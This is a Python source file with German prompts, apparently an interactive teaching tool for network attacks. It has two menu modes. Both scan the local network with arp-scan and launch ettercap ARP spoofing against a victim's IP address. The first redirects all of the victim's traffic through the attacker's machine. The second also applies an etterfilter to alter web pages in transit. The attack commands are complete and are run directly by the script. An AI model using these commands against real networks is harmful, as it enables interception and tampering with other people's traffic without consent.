#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import readline
import colors

from generics import rlinput, execute, clearScreen

def SniffingMode():
	shellCols = colors.ShellColors
	showMenu = True
	while(showMenu):
		clearScreen()
		print(shellCols.UNDERLINE + shellCols.HEADER + 'Angriff mittels einfachem ARP-Spoofing: ' + shellCols.ENDC + '\n')

		##Ip-Adressen im Netzwerk herausfinden
		print('In diesem Tutorial wird der ARP Cache des Opfers manipuliert und erlaubt somit den gesamten Netzwerkverkehr des Opfers über unseren Rechner umzuleiten.')
		command = rlinput('Zuerst das verwendete Netzwerkinterface herausfinden mit: \n# ', 'ifconfig')
		os.system(command)
		network_interface = raw_input('Verwendete Netzwerkinterface: ')
		command = rlinput('Nun werden mit folgendem Befehl die im Netzwerk aktiven Benutzer angezeigt: \n# ' , 'arp-scan --interface ' + network_interface + ' --localnet')
		os.system(command)
		print('\n')

		##Angriff mithilfe von Ettercap starten
		victim_ipadress = raw_input('Gib nun die IP-Adresse des Opfers ein: ')
		command = rlinput('Nun wird mit folgendem Befehl der Angriff mittels Ettercap gestartet; Ettercap startet in einem neuen Fenster und der Angriff lässt sich mit "q" beenden:\n# ', 'ettercap -T -F test.ef -i ' + network_interface + ' -M ARP /' + victim_ipadress + '// ///')
		p = execute(command)
		print('\n')
		print('Nun wird der gesamte Netzwerkverkehr des Opfers über unseren Rechner umgeleitet und erlaubt so die Einsicht und Manipulation der Inhalte.')

		##Beenden
		selection = raw_input(shellCols.BLUE + '\nDrücke 0 um zum Menü zurückzukehren.' + shellCols.ENDC)
		print('Gehe zurück zum Hauptmenü')
		showMenu = False
		break

def ReplaceImagesMode():
	shellCols = colors.ShellColors
	showMenu = True
	while(showMenu):
		clearScreen()
		print(shellCols.UNDERLINE + shellCols.HEADER + 'Manipulation des Netzwerkverkehrs mit ARP-Spoofing: ' + shellCols.ENDC + '\n')

		##Ip-Adressen im Netzwerk herausfinden
		print('In diesem Tutorial werden wie im einfachen ARP-Spoofing mit Ettercap der ARP Cache des Opfers manipuliert. Zusätzlich benutzen wir einen Etterfilter, der den Netzwerkverkehr untersucht und je nach Programmierung des Filters Pakete droppt, den Inhalt manipuliert oder neu erstellte Pakete verschickt. Es wurde bereits ein Filter erstellt, der auf Websiten ein Youtubevideo einbinden soll.\n')

		command = rlinput('Zuerst das verwendete Netzwerkinterface herausfinden mit: \n# ', 'ifconfig')
		os.system(command)
		network_interface = raw_input('Verwendete Netzwerkinterface: ')
		command = rlinput('Nun werden mit folgendem Befehl die im Netzwerk aktiven Benutzer angezeigt: \n# ' , 'arp-scan --interface ' + network_interface + ' --localnet')
		os.system(command)
		print('\n')

		##Filterangriff mit Ettercap starten
		victim_ipadress = raw_input('Gib nun die IP-Adresse des Opfers ein: ')
		path = os.path.dirname(os.path.abspath(__file__))

		#### Filter fehlt noch
		filter = path + "/test.ef"
		command = rlinput('Nun werden wir mit folgendem Befehl unter Angabe des verwendeten Filters das ARP-Spoofing durchgeführt; Ettercap startet in einem neuen Fenster und der Angriff lässt sich mit "q" beenden:\n# ', 'ettercap -T -q -F ' + filter +' -i ' + network_interface + ' -M ARP /' + victim_ipadress + '// ///')
		p = execute(command)
		print('\n')
		print('Nun wird der gesamte Netzwerkverkehr des Opfers über unseren Rechner umgeleitet und durch den Filter manipuliert.')

		##Beenden
		selection = raw_input(shellCols.BLUE + '\nDrücke 0 um zum Menü zurückzukehren.' + shellCols.ENDC)
		print('Gehe zurück zum Hauptmenü')
		showMenu = False
		break

